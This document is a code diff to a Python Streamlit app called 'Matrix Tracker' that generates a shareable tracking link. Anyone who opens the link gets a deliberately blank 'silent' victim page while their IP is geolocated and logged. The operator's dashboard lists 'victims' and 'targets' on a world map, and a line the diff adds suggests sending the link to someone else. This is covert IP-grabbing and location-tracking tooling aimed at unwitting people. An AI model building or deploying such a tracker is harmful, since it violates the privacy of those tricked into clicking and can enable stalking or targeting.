@@ -4,9 +4,8 @@ import requests
 import uuid
 from datetime import datetime, timedelta
 import time
-import urllib.parse
 
-# Optional map support
+# Optional map
 try:
     import folium
     from streamlit_folium import st_folium
@@ -53,16 +52,24 @@ def get_location(ip):
     return None
 
 def get_public_base_url():
+    """Best method for Streamlit Cloud"""
+    # Try multiple ways to get the correct public URL
     try:
-        sessions = st.runtime.get_instance()._session_mgr.list_active_sessions()
-        if sessions:
-            req = st.runtime.get_instance()._session_mgr.get_active_session_info(sessions[0]).request
-            base = urllib.parse.urlunparse((req.protocol, req.host, "", "", "", ""))
-            if base and "localhost" not in base:
-                return base
+        # Streamlit Cloud specific
+        if "streamlit.app" in st.runtime.get_instance()._get_base_url():
+            return st.runtime.get_instance()._get_base_url()
     except:
         pass
-    return "http://localhost:8501"
+    
+    try:
+        base = st.runtime.get_instance()._get_base_url()
+        if base and not base.startswith("http://localhost"):
+            return base
+    except:
+        pass
+
+    # Fallback
+    return "https://your-app-name.streamlit.app"  # ← Change this after deployment
 
 def matrix_rain():
     st.markdown("""
@@ -82,7 +89,7 @@ def matrix_rain():
     </script>
     """, unsafe_allow_html=True)
 
-# ======================= VICTIM PAGE =======================
+# Victim Page (Silent)
 def victim_page():
     st.set_page_config(page_title=" ", page_icon=" ", layout="wide")
     params = st.query_params
@@ -102,7 +109,7 @@ def victim_page():
     <style>body,.stApp{{display:none !important;}}</style>
     """, unsafe_allow_html=True)
 
-# ======================= MAIN APP =======================
+# Main Dashboard
 def main():
     st.set_page_config(page_title="Matrix Tracker", page_icon="💻", layout="wide")
     matrix_rain()
@@ -146,7 +153,7 @@ def main():
                     st.error("❌ Invalid credentials")
         return
 
-    # Dashboard
+    # === DASHBOARD ===
     st.title(f"👾 WELCOME, {st.session_state.username.upper()}")
 
     if 'share_link' not in st.session_state:
@@ -158,6 +165,7 @@ def main():
     with col1:
         st.subheader("🌐 SHAREABLE TRACKING LINK")
         st.code(st.session_state.share_link, language="markdown")
+        st.info("Copy this link and test it in another browser or send to someone else.")
     with col2:
         if st.button("📋 Copy Link"):
             st.success("✅ Copied!")
@@ -168,7 +176,7 @@ def main():
     with shelve.open(DB_FILE) as db:
         tracked = db.get("tracked", {})
 
-    # Cleanup old entries
+    # Cleanup
     now = datetime.now()
     to_delete = [k for k, v in tracked.items() 
                  if datetime.fromisoformat(v['timestamp']) < now - timedelta(hours=SESSION_TIMEOUT_HOURS)]
@@ -179,19 +187,16 @@ def main():
             db["tracked"] = tracked
 
     if not tracked:
-        st.info("⏳ No victims yet. Share the link.")
+        st.info("⏳ No victims yet.")
     else:
         st.success(f"📍 **{len(tracked)}** target(s) tracked")
-
         if HAS_MAP:
-            st.subheader("🌍 Victims on World Map")
+            st.subheader("🌍 World Map")
             m = folium.Map(location=[20, 0], zoom_start=2)
             for data in tracked.values():
                 if data.get('latitude') and data.get('longitude'):
-                    folium.Marker(
-                        [data['latitude'], data['longitude']],
-                        popup=f"{data.get('city')}, {data.get('country')}<br>IP: {data.get('ip')}",
-                    ).add_to(m)
+                    folium.Marker([data['latitude'], data['longitude']], 
+                                popup=f"{data.get('city')}, {data.get('country')}").add_to(m)
             st_folium(m, width=700, height=450)
 
         for vid, data in tracked.items():
@@ -208,14 +213,12 @@ def main():
         st.session_state.logged_in = False
         st.rerun()
 
-    # Auto Refresh every 5 minutes
     st.markdown(f"""
     <script>
         setTimeout(() => window.location.reload(), {AUTO_REFRESH_SECONDS * 1000});
     </script>
     """, unsafe_allow_html=True)
 
-# ======================= ROUTING =======================
 if __name__ == "__main__":
     if st.query_params.get("r"):
         victim_page()
